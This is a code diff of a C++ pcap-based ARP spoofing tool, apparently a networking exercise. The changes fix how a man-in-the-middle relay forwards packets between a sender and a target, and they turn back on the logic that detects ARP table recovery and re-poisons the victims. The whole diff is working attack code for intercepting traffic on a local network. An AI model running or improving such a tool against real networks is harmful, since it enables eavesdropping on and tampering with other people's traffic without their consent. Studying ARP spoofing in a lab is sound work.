@@ -79,7 +79,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 		//print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth -> ether_dhost);
 
 		//Sender -> Attacker -> Target
-                if(ntohs(Packet_eth-> ether_type)==(EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==SenderMac){
+                if(Mac(Packet_eth->ether_shost)==SenderMac){
 			
 			printf("\n");
 			printf("Before\n");	
@@ -104,7 +104,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);
 	
 
-                        res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
+                        res = pcap_sendpacket(handle, received_pkt, header->caplen);
                         if (res != 0) {
                                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                         }
@@ -113,7 +113,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
                         }    
                 }
                 //Target -> Attaceker -> Sender
-                else if(ntohs(Packet_eth -> ether_type) == (EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==TargetMac){
+                else if(Mac(Packet_eth->ether_shost)==TargetMac){
 
 
 			printf("\nBefore\n");
@@ -130,7 +130,9 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 
 			memcpy(&Packet_ip->ip_src.s_addr,&tmpAip,sizeof(uint32_t));
 			memcpy(&Packet_ip->ip_dst.s_addr,&tmpSenderMac,sizeof(uint32_t));
-                        res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
+
+
+                        res = pcap_sendpacket(handle, received_pkt,header->caplen );
 
 
 			printf("\nAfter\n");
@@ -138,14 +140,14 @@ int start_spoofing(char*dev ,char* sip , char* tip){
                         if (res != 0) {
                                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                         }else{
-                                printf("\nTarget-> Attacker -> Sender\n");
+                                printf("\n**** Target-> Attacker -> Sender ****\n");
                         }
                         
                 }
 
                 //When ARP Table Recover
                 else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
-                        //if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
+                        if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                 //Sender감염 패킷생성
                                 EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                                 //패킷 전송
@@ -156,7 +158,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 				{
                                         printf("\n+Detecting Arp Recover and re-Infection+\n");
                                 }
-                       // }
+                        }
                 }
                 else{
                         EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
@@ -189,7 +191,6 @@ int main(int argc, char* argv[]) {
         for (int i = 2; i < argc-1; i+=2) {
                 std::future<int> spoof_thread = std::async(std::launch::async, start_spoofing, dev, argv[i], argv[i + 1]);
                 spoof_threads.push_back(std::move(spoof_thread));
-
         }
 
         // 모든 스레드가 끝날 때까지 기다림
